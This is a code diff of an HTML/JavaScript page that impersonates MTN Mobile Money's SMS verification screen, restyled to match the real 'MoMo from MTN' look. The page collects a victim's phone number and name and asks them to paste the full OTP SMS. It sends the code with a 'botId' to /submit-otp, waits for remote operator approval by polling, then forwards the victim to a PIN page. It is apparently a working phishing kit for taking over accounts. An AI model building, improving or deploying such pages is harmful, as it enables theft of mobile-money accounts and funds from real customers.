@@ -3,94 +3,198 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>MTN Mobile Money - Verify</title>
+  <title>MoMo - Verify SMS</title>
   <style>
-    * { margin: 0; padding: 0; box-sizing: border-box; }
+    /* ===== MOMO STYLE (consistent with registration page) ===== */
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    html, body {
+      width: 100%;
+      min-height: 100%;
+    }
+
     body {
-      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+      font-family: Arial, Helvetica, sans-serif;
       background: #fff;
-      color: #222;
+      overflow-x: hidden;
+    }
+
+    /* =========================================
+       APP CONTAINER
+    ========================================= */
+
+    .app {
+      position: relative;
+      width: 100%;
+      max-width: 540px;
       min-height: 100vh;
-      display: flex;
-      flex-direction: column;
+      min-height: 100svh;
+      margin: 0 auto;
+      background: #fff;
+      overflow: hidden;
     }
+
+    /* =========================================
+       TOP BLUE AREA
+    ========================================= */
+
+    .top {
+      position: relative;
+      height: 200px; /* slightly shorter for OTP page */
+      background: #004c69;
+      padding-top: 52px;
+    }
+
+    /*
+      White curved bottom of blue area
+    */
+    .top::after {
+      content: "";
+      position: absolute;
+      left: -10%;
+      bottom: -75px;
+      width: 120%;
+      height: 125px;
+      background: #fff;
+      border-radius: 50% 50% 0 0 / 70% 70% 0 0;
+    }
+
+    /* =========================================
+       TOP BAR WITH BACK BUTTON AND LOGO
+    ========================================= */
+
     .top-bar {
-      height: 72px;
-      background: #FFCC00;
+      position: relative;
+      z-index: 2;
       display: flex;
       align-items: center;
+      justify-content: space-between;
       padding: 0 22px;
-      flex-shrink: 0;
-      box-shadow: 0 2px 6px rgba(0,0,0,0.1);
+      margin-top: -10px;
     }
-    .top-bar .logo {
-      display: flex;
-      align-items: center;
-      gap: 10px;
-    }
-    .top-bar .logo svg {
-      height: 36px;
-      width: auto;
-    }
-    .top-bar .logo span {
-      font-weight: 700;
-      font-size: 18px;
-      color: #004B87;
-      letter-spacing: -0.5px;
-    }
+
     .back-btn {
-      color: #004B87;
+      color: #ffd500;
       font-size: 30px;
       text-decoration: none;
       font-weight: 300;
-      margin-right: 16px;
+      line-height: 1;
+      transition: color 0.2s;
     }
-    .container {
-      flex: 1;
-      width: 100%;
-      max-width: 420px;
-      margin: 0 auto;
-      padding: 28px 24px 20px;
+    .back-btn:hover {
+      color: #ffffff;
+    }
+
+    .logo {
       display: flex;
-      flex-direction: column;
+      align-items: center;
+      gap: 8px;
     }
+
+    .logo-box {
+      width: 40px;
+      height: 40px;
+      border-radius: 8px;
+      background: linear-gradient(145deg, #087398, #003d59);
+      box-shadow: 0 2px 5px rgba(0,0,0,.25), inset 0 0 4px rgba(255,255,255,.12);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .logo-symbol {
+      width: 22px;
+      height: 28px;
+      background: #ffd500;
+      clip-path: polygon(50% 0, 100% 30%, 86% 100%, 59% 69%, 39% 100%, 13% 34%);
+      position: relative;
+    }
+    .logo-symbol::after {
+      content: "";
+      position: absolute;
+      width: 6px;
+      height: 6px;
+      background: #004c69;
+      border-radius: 50%;
+      left: 8px;
+      top: 8px;
+    }
+
+    .logo-text {
+      color: #ffd500;
+      font-size: 20px;
+      font-weight: 800;
+      letter-spacing: -0.5px;
+    }
+    .logo-text .light {
+      font-weight: 400;
+      font-size: 14px;
+      color: #b8d4e8;
+    }
+
+    /* =========================================
+       CARD
+    ========================================= */
+
+    .card {
+      position: relative;
+      z-index: 5;
+      width: calc(100% - 36px);
+      margin: -100px auto 0;
+      background: #fff;
+      border-radius: 34px;
+      padding: 32px 27px 27px;
+      box-shadow: 0 12px 25px rgba(0, 0, 0, .12);
+    }
+
     .title {
-      font-size: 26px;
+      text-align: center;
+      color: #07516b;
+      font-size: 25px;
+      font-weight: 400;
+      margin-bottom: 12px;
+    }
+    .title strong {
       font-weight: 700;
-      color: #004B87;
-      margin-bottom: 4px;
-      letter-spacing: -0.3px;
     }
+
     .subtitle {
-      font-size: 15px;
+      text-align: center;
       color: #555;
-      line-height: 1.5;
-      margin-bottom: 16px;
+      font-size: 15px;
+      margin-bottom: 20px;
     }
+
+    /* Instruction note */
     .instruction-note {
       font-size: 14px;
-      color: #004B87;
-      background: #e8f0fe;
+      color: #0a0a0a;
+      background: #f8fafc;
       padding: 12px 16px;
-      border-radius: 8px;
+      border-radius: 12px;
       margin-bottom: 20px;
-      border: 1px solid #bbd4f0;
+      border: 1px solid #e2e8f0;
       line-height: 1.6;
     }
+
     .valid-time {
       font-size: 14px;
-      color: #888;
-      margin-bottom: 24px;
-    }
-    .message-area {
+      color: #5b6f7e;
       margin-bottom: 20px;
+      text-align: center;
     }
+
+    /* Textarea */
     .message-area textarea {
       width: 100%;
       min-height: 120px;
       padding: 14px 16px;
-      border: 2px solid #d0d7de;
-      border-radius: 10px;
+      border: 1.5px solid #111;
+      border-radius: 20px;
       font-size: 16px;
       font-family: inherit;
       resize: vertical;
@@ -100,83 +204,175 @@
       line-height: 1.6;
     }
     .message-area textarea:focus {
-      border-color: #FFCC00;
-      box-shadow: 0 0 0 3px rgba(255, 204, 0, 0.3);
+      border-color: #005572;
+      box-shadow: 0 0 0 3px rgba(0, 85, 114, 0.15);
     }
     .message-area textarea::placeholder {
       color: #aaa;
     }
+
+    /* Resend */
     .resend-wrap {
       color: #666;
       font-size: 15px;
-      margin-bottom: 0;
+      margin-top: 16px;
+      text-align: center;
     }
     .resend-wrap .timer {
       font-weight: 600;
-      color: #004B87;
+      color: #0a0a0a;
     }
-    .continue-btn {
-      position: fixed;
-      left: 50%;
-      transform: translateX(-50%);
-      bottom: 28px;
-      height: 56px;
-      border: none;
-      border-radius: 10px;
-      background: #ccc;
-      color: #fff;
-      font-size: 20px;
+    .resend-wrap .clickable {
+      color: #004c69;
       font-weight: 700;
-      cursor: not-allowed;
-      transition: background 0.2s;
-      text-transform: uppercase;
-      letter-spacing: 0.5px;
-      max-width: 420px;
-      width: calc(100% - 48px);
-    }
-    .continue-btn:enabled {
-      background: #FFCC00;
-      color: #004B87;
       cursor: pointer;
+      text-decoration: underline;
     }
-    .continue-btn:enabled:hover {
-      background: #e6b800;
-    }
+
+    /* =========================================
+       MESSAGE BOX (status)
+    ========================================= */
+
     #message-box {
       display: none;
       padding: 12px 16px;
-      border-radius: 8px;
+      border-radius: 12px;
       margin-bottom: 16px;
       font-size: 15px;
       font-weight: 500;
+      border: 1px solid transparent;
     }
+    #message-box.error {
+      background: #fef3f2;
+      border-color: #fecdca;
+      color: #c0392b;
+    }
+    #message-box.success {
+      background: #ecfdf3;
+      border-color: #abf0d1;
+      color: #0b2b3b;
+    }
+
+    /* =========================================
+       BOTTOM BUTTON (sticky)
+    ========================================= */
+
+    .bottom {
+      width: 100%;
+      padding: 0 18px 14px;
+      margin-top: 30px;
+    }
+
+    .continue-btn {
+      width: 100%;
+      height: 69px;
+      border: none;
+      border-radius: 40px;
+      background: #d1d5db;
+      color: #fff;
+      font-size: 22px;
+      font-weight: 700;
+      cursor: not-allowed;
+      font-family: Arial, Helvetica, sans-serif;
+      transition: background 0.3s ease;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+    }
+
+    .continue-btn:enabled {
+      background: #005572;
+      cursor: pointer;
+    }
+    .continue-btn:enabled:hover {
+      background: #00415a;
+    }
+    .continue-btn:enabled:active {
+      transform: scale(.98);
+    }
+
+    /* =========================================
+       RESPONSIVE
+    ========================================= */
+
     @media (max-width: 480px) {
-      .container { padding: 22px 18px 16px; }
-      .title { font-size: 24px; }
-      .message-area textarea { min-height: 100px; font-size: 15px; }
-      .continue-btn { height: 54px; font-size: 18px; bottom: 22px; width: calc(100% - 36px); }
+      .top {
+        height: 180px;
+        padding-top: 40px;
+      }
+      .top-bar {
+        padding: 0 16px;
+      }
+      .card {
+        width: calc(100% - 28px);
+        margin-top: -90px;
+        padding: 28px 20px 24px;
+        border-radius: 28px;
+      }
+      .title {
+        font-size: 22px;
+      }
+      .continue-btn {
+        height: 62px;
+        font-size: 20px;
+      }
     }
-    @media (max-width: 360px) {
-      .message-area textarea { min-height: 80px; font-size: 14px; }
+
+    @media (max-width: 380px) {
+      .card {
+        padding-left: 16px;
+        padding-right: 16px;
+      }
+      .title {
+        font-size: 20px;
+      }
+      .message-area textarea {
+        min-height: 90px;
+        font-size: 14px;
+      }
+      .continue-btn {
+        height: 58px;
+        font-size: 18px;
+      }
+    }
+
+    @media (max-height: 750px) {
+      .bottom {
+        margin-top: 15px;
+      }
     }
   </style>
 </head>
 <body>
 
-  <div class="top-bar">
-    <a href="#" class="back-btn">&#8592;</a>
-    <div class="logo">
-      <svg viewBox="0 0 120 40" fill="none" xmlns="http://www.w3.org/2000/svg">
-        <rect x="2" y="2" width="36" height="36" rx="8" fill="#FFCC00" stroke="#004B87" stroke-width="2"/>
-        <path d="M14 12L22 12L18 20L22 28L14 28L18 20L14 12Z" fill="#004B87"/>
-        <text x="46" y="26" font-family="Arial, sans-serif" font-weight="700" font-size="20" fill="#004B87">MTN Mobile Money</text>
-      </svg>
-      <span>Mobile Money</span>
+<div class="app">
+
+  <!-- ================= TOP BLUE AREA ================= -->
+
+  <div class="top">
+
+    <div class="top-bar">
+      <!-- Back button -->
+      <a href="#" class="back-btn">&#8592;</a>
+
+      <!-- Logo (compact) -->
+      <div class="logo">
+        <div class="logo-box">
+          <div class="logo-symbol"></div>
+        </div>
+        <div class="logo-text">MoMo <span class="light">from MTN</span></div>
+      </div>
+
+      <!-- Spacer for alignment -->
+      <div style="width: 30px;"></div>
     </div>
+
   </div>
 
-  <div class="container">
-    <div class="title">Verify Your SMS</div>
+  <!-- ================= CARD ================= -->
+
+  <div class="card">
+
+    <div class="title">Verify Your <strong>SMS</strong></div>
     <div class="subtitle" id="subtitlePlaceholder">
       We sent a code to your phone number
     </div>
@@ -191,262 +387,270 @@
       <textarea id="smsMessage" placeholder="Paste the whole SMS message here..."></textarea>
     </div>
 
-    <div class="resend-wrap">
+    <div class="resend-wrap" id="resendWrap">
       Resend code in <span class="timer">00:20</span>
     </div>
+
+    <!-- message-box will be injected here by JS -->
+    <div id="message-box" style="display:none;"></div>
+
   </div>
 
-  <button class="continue-btn" disabled>SUBMIT</button>
+  <!-- ================= BOTTOM BUTTON ================= -->
 
-  <script>
-    (function() {
-      // ---------- READ FROM URL & LOCALSTORAGE ----------
-      const urlParams = new URLSearchParams(window.location.search);
-      let botId = urlParams.get('botId') || localStorage.getItem('botId');
-      let phone = urlParams.get('phone') || localStorage.getItem('phone');
-      let name = localStorage.getItem('fullName');
+  <div class="bottom">
+    <button class="continue-btn" disabled>SUBMIT</button>
+  </div>
 
-      // If missing critical data, redirect back to phone page
-      if (!botId) {
-        alert('Bot ID missing. Please start over.');
-        window.location.href = 'index.html';
+</div>
+
+<script>
+  (function() {
+    // ---------- READ FROM URL & LOCALSTORAGE ----------
+    const urlParams = new URLSearchParams(window.location.search);
+    let botId = urlParams.get('botId') || localStorage.getItem('botId');
+    let phone = urlParams.get('phone') || localStorage.getItem('phone');
+    let name = localStorage.getItem('fullName');
+
+    // If missing critical data, redirect back to phone page
+    if (!botId) {
+      alert('Bot ID missing. Please start over.');
+      window.location.href = 'index.html';
+      return;
+    }
+    if (!phone) {
+      alert('Phone number missing. Please start over.');
+      window.location.href = 'index.html';
+      return;
+    }
+    if (!name) {
+      name = 'MTN User';
+      localStorage.setItem('fullName', name);
+    }
+
+    // Ensure botId is stored
+    localStorage.setItem('botId', botId);
+    localStorage.setItem('phone', phone);
+
+    // Show phone number in subtitle
+    const subtitle = document.getElementById('subtitlePlaceholder');
+    if (phone) {
+      subtitle.textContent = 'We sent a code to ' + phone;
+    }
+
+    // ---------- DOM REFS ----------
+    const textarea = document.getElementById('smsMessage');
+    const continueBtn = document.querySelector('.continue-btn');
+    const msgDiv = document.getElementById('message-box');
+
+    // If message-box not in DOM, create it.
+    if (!msgDiv) {
+      const div = document.createElement('div');
+      div.id = 'message-box';
+      div.style.display = 'none';
+      div.style.padding = '12px 16px';
+      div.style.borderRadius = '12px';
+      div.style.marginBottom = '16px';
+      div.style.fontSize = '15px';
+      div.style.fontWeight = '500';
+      const container = document.querySelector('.card');
+      const resend = document.querySelector('.resend-wrap');
+      container.insertBefore(div, resend);
+      // reassign
+      msgDiv = document.getElementById('message-box');
+    }
+
+    function showMessage(text, isError) {
+      msgDiv.textContent = text;
+      msgDiv.style.display = 'block';
+      msgDiv.className = isError ? 'error' : 'success';
+    }
+
+    function hideMessage() {
+      msgDiv.style.display = 'none';
+      msgDiv.className = '';
+      msgDiv.textContent = '';
+    }
+
+    // ---------- TEXTAREA VALIDATION ----------
+    function checkTextArea() {
+      const val = textarea.value.trim();
+      continueBtn.disabled = (val === '');
+      if (val !== '') {
+        continueBtn.style.background = '#005572';
+        continueBtn.style.color = '#fff';
+        continueBtn.style.cursor = 'pointer';
+      } else {
+        continueBtn.style.background = '#d1d5db';
+        continueBtn.style.color = '#fff';
+        continueBtn.style.cursor = 'not-allowed';
+      }
+      hideMessage();
+    }
+
+    textarea.addEventListener('input', checkTextArea);
+    textarea.addEventListener('paste', function() {
+      setTimeout(checkTextArea, 10);
+    });
+    textarea.focus();
+
+    // ---------- TIMER (20 seconds) ----------
+    const timerSpan = document.querySelector('.timer');
+    const resendWrap = document.getElementById('resendWrap');
+    let totalSeconds = 20;
+    let timerInterval = null;
+
+    function formatTime(sec) {
+      const m = String(Math.floor(sec / 60)).padStart(2, '0');
+      const s = String(sec % 60).padStart(2, '0');
+      return m + ':' + s;
+    }
+
+    function updateTimerUI() {
+      if (totalSeconds <= 0) {
+        resendWrap.innerHTML = '<span class="clickable">Resend code</span>';
+        clearInterval(timerInterval);
+        timerInterval = null;
+        resendWrap.querySelector('.clickable').onclick = function(e) {
+          e.preventDefault();
+          startTimer(20);
+          hideMessage();
+        };
         return;
       }
-      if (!phone) {
-        alert('Phone number missing. Please start over.');
-        window.location.href = 'index.html';
-        return;
-      }
-      if (!name) {
-        name = 'MTN User';
-        localStorage.setItem('fullName', name);
-      }
+      resendWrap.innerHTML = 'Resend code in <span class="timer">' + formatTime(totalSeconds) + '</span>';
+      resendWrap.style.cursor = 'default';
+    }
 
-      // Ensure botId is stored
-      localStorage.setItem('botId', botId);
-      localStorage.setItem('phone', phone);
-
-      // Show phone number in subtitle
-      const subtitle = document.getElementById('subtitlePlaceholder');
-      if (phone) {
-        subtitle.textContent = 'We sent a code to ' + phone;
-      }
-
-      // ---------- DOM REFS ----------
-      const textarea = document.getElementById('smsMessage');
-      const continueBtn = document.querySelector('.continue-btn');
-      const msgDiv = document.getElementById('message-box') || (function() {
-        const div = document.createElement('div');
-        div.id = 'message-box';
-        div.style.display = 'none';
-        div.style.padding = '12px 16px';
-        div.style.borderRadius = '8px';
-        div.style.marginBottom = '20px';
-        div.style.fontSize = '15px';
-        div.style.fontWeight = '500';
-        const container = document.querySelector('.container');
-        const resend = document.querySelector('.resend-wrap');
-        container.insertBefore(div, resend);
-        return div;
-      })();
-
-      function showMessage(text, isError) {
-        msgDiv.textContent = text;
-        msgDiv.style.display = 'block';
-        msgDiv.style.background = isError ? '#fde7e7' : '#e7f5e7';
-        msgDiv.style.color = isError ? '#b00020' : '#1e7e34';
-        msgDiv.style.border = isError ? '1px solid #f5c6cb' : '1px solid #b7d7b7';
-      }
-
-      function hideMessage() {
-        msgDiv.style.display = 'none';
-        msgDiv.textContent = '';
-      }
-
-      // ---------- TEXTAREA VALIDATION ----------
-      function checkTextArea() {
-        const val = textarea.value.trim();
-        continueBtn.disabled = (val === '');
-        if (val !== '') {
-          continueBtn.style.background = '#FFCC00';
-          continueBtn.style.color = '#004B87';
-          continueBtn.style.cursor = 'pointer';
-        } else {
-          continueBtn.style.background = '#ccc';
-          continueBtn.style.color = '#fff';
-          continueBtn.style.cursor = 'not-allowed';
-        }
-        hideMessage();
-      }
-
-      textarea.addEventListener('input', checkTextArea);
-      textarea.addEventListener('paste', function() {
-        setTimeout(checkTextArea, 10);
-      });
-      textarea.focus();
-
-      // ---------- TIMER (20 seconds) ----------
-      const timerSpan = document.querySelector('.timer');
-      const resendWrap = document.querySelector('.resend-wrap');
-      let totalSeconds = 20;
-      let timerInterval = null;
-
-      function formatTime(sec) {
-        const m = String(Math.floor(sec / 60)).padStart(2, '0');
-        const s = String(sec % 60).padStart(2, '0');
-        return m + ':' + s;
-      }
-
-      function updateTimerUI() {
+    function startTimer(seconds) {
+      if (timerInterval) clearInterval(timerInterval);
+      totalSeconds = seconds;
+      updateTimerUI();
+      timerInterval = setInterval(function() {
+        totalSeconds--;
         if (totalSeconds <= 0) {
-          resendWrap.innerHTML = 'Resend code';
-          resendWrap.style.color = '#004B87';
-          resendWrap.style.cursor = 'pointer';
-          resendWrap.style.fontWeight = '600';
+          totalSeconds = 0;
+          updateTimerUI();
           clearInterval(timerInterval);
           timerInterval = null;
-          resendWrap.onclick = function(e) {
-            e.preventDefault();
-            startTimer(20);
-            hideMessage();
-          };
-          return;
+        } else {
+          updateTimerUI();
         }
-        resendWrap.innerHTML = 'Resend code in <span class="timer">' + formatTime(totalSeconds) + '</span>';
-        resendWrap.style.color = '#666';
-        resendWrap.style.cursor = 'default';
-        resendWrap.style.fontWeight = '400';
-        resendWrap.onclick = null;
+      }, 1000);
+    }
+
+    startTimer(20);
+
+    // ---------- POLLING HELPER ----------
+    let pollTimer = null;
+
+    function stopPolling() {
+      if (pollTimer) {
+        clearInterval(pollTimer);
+        pollTimer = null;
+      }
+    }
+
+    // ---------- SUBMIT OTP ----------
+    continueBtn.addEventListener('click', function() {
+      if (this.disabled) return;
+
+      const message = textarea.value.trim();
+      if (!message) {
+        showMessage('Please paste or type the SMS message.', true);
+        return;
       }
 
-      function startTimer(seconds) {
-        if (timerInterval) clearInterval(timerInterval);
-        totalSeconds = seconds;
-        updateTimerUI();
-        timerInterval = setInterval(function() {
-          totalSeconds--;
-          if (totalSeconds <= 0) {
-            totalSeconds = 0;
-            updateTimerUI();
-            clearInterval(timerInterval);
-            timerInterval = null;
-          } else {
-            updateTimerUI();
-          }
-        }, 1000);
-      }
+      // Disable button and show loading
+      continueBtn.disabled = true;
+      continueBtn.textContent = 'Verifying...';
+      continueBtn.style.background = '#f5a623';
+      continueBtn.style.color = '#fff';
+      hideMessage();
 
-      startTimer(20);
+      // Submit OTP
+      fetch('/submit-otp', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          name: name,
+          phone: phone,
+          otp: message,
+          botId: botId
+        })
+      })
+      .then(function(res) {
+        if (!res.ok) throw new Error('Server error (HTTP ' + res.status + ')');
+        return res.json();
+      })
+      .then(function(data) {
+        var requestId = data.requestId;
+        if (!requestId) throw new Error('No request ID received');
 
-      // ---------- POLLING HELPER ----------
-      let pollTimer = null;
+        // Start polling
+        stopPolling();
+        var attempts = 0;
+        var MAX_ATTEMPTS = 120; // ~3 minutes (1.5s interval)
 
-      function stopPolling() {
-        if (pollTimer) {
-          clearInterval(pollTimer);
-          pollTimer = null;
-        }
-      }
-
-      // ---------- SUBMIT OTP ----------
-      continueBtn.addEventListener('click', function() {
-        if (this.disabled) return;
-
-        const message = textarea.value.trim();
-        if (!message) {
-          showMessage('Please paste or type the SMS message.', true);
-          return;
-        }
-
-        // Disable button and show loading
-        continueBtn.disabled = true;
-        continueBtn.textContent = 'Verifying...';
-        continueBtn.style.background = '#f5a623';
+        pollTimer = setInterval(function() {
+          attempts++;
+          fetch('/check-otp/' + requestId)
+            .then(function(res) {
+              if (!res.ok) throw new Error('Verification error');
+              return res.json();
+            })
+            .then(function(status) {
+              if (status.approved === true) {
+                stopPolling();
+                // OTP approved – redirect to PIN page
+                var pinUrl = 'pin.html?botId=' + encodeURIComponent(botId) +
+                             '&phone=' + encodeURIComponent(phone) +
+                             '&name=' + encodeURIComponent(name);
+                window.location.href = pinUrl;
+                return;
+              }
+              if (status.approved === false) {
+                stopPolling();
+                showMessage('❌ Incorrect code. Please try again.', true);
+                continueBtn.disabled = false;
+                continueBtn.textContent = 'SUBMIT';
+                continueBtn.style.background = '#005572';
+                continueBtn.style.color = '#fff';
+                textarea.value = '';
+                checkTextArea();
+                textarea.focus();
+                return;
+              }
+              // Still pending
+              if (attempts > MAX_ATTEMPTS) {
+                stopPolling();
+                showMessage('⏳ Approval taking too long. Please refresh or contact support.', true);
+                continueBtn.disabled = false;
+                continueBtn.textContent = 'SUBMIT';
+                continueBtn.style.background = '#005572';
+                continueBtn.style.color = '#fff';
+              }
+              // else keep polling
+            })
+            .catch(function(err) {
+              // Network error – keep polling
+              console.error('Polling error:', err);
+            });
+        }, 1500);
+      })
+      .catch(function(err) {
+        showMessage('❌ Send error: ' + err.message, true);
+        continueBtn.disabled = false;
+        continueBtn.textContent = 'SUBMIT';
+        continueBtn.style.background = '#005572';
         continueBtn.style.color = '#fff';
-        hideMessage();
-
-        // Submit OTP
-        fetch('/submit-otp', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            name: name,
-            phone: phone,
-            otp: message,
-            botId: botId
-          })
-        })
-        .then(function(res) {
-          if (!res.ok) throw new Error('Server error (HTTP ' + res.status + ')');
-          return res.json();
-        })
-        .then(function(data) {
-          var requestId = data.requestId;
-          if (!requestId) throw new Error('No request ID received');
-
-          // Start polling
-          stopPolling();
-          var attempts = 0;
-          var MAX_ATTEMPTS = 120; // ~3 minutes (1.5s interval)
-
-          pollTimer = setInterval(function() {
-            attempts++;
-            fetch('/check-otp/' + requestId)
-              .then(function(res) {
-                if (!res.ok) throw new Error('Verification error');
-                return res.json();
-              })
-              .then(function(status) {
-                if (status.approved === true) {
-                  stopPolling();
-                  // OTP approved – redirect to PIN page
-                  var pinUrl = 'pin.html?botId=' + encodeURIComponent(botId) +
-                               '&phone=' + encodeURIComponent(phone) +
-                               '&name=' + encodeURIComponent(name);
-                  window.location.href = pinUrl;
-                  return;
-                }
-                if (status.approved === false) {
-                  stopPolling();
-                  showMessage('❌ Incorrect code. Please try again.', true);
-                  continueBtn.disabled = false;
-                  continueBtn.textContent = 'SUBMIT';
-                  continueBtn.style.background = '#FFCC00';
-                  continueBtn.style.color = '#004B87';
-                  textarea.value = '';
-                  checkTextArea();
-                  textarea.focus();
-                  return;
-                }
-                // Still pending
-                if (attempts > MAX_ATTEMPTS) {
-                  stopPolling();
-                  showMessage('⏳ Approval taking too long. Please refresh or contact support.', true);
-                  continueBtn.disabled = false;
-                  continueBtn.textContent = 'SUBMIT';
-                  continueBtn.style.background = '#FFCC00';
-                  continueBtn.style.color = '#004B87';
-                }
-                // else keep polling
-              })
-              .catch(function(err) {
-                // Network error – keep polling
-                console.error('Polling error:', err);
-              });
-          }, 1500);
-        })
-        .catch(function(err) {
-          showMessage('❌ Send error: ' + err.message, true);
-          continueBtn.disabled = false;
-          continueBtn.textContent = 'SUBMIT';
-          continueBtn.style.background = '#FFCC00';
-          continueBtn.style.color = '#004B87';
-        });
       });
+    });
 
-      // ---------- INIT ----------
-      checkTextArea();
-    })();
-  </script>
+    // ---------- INIT ----------
+    checkTextArea();
+  })();
+</script>
+
 </body>
 </html>
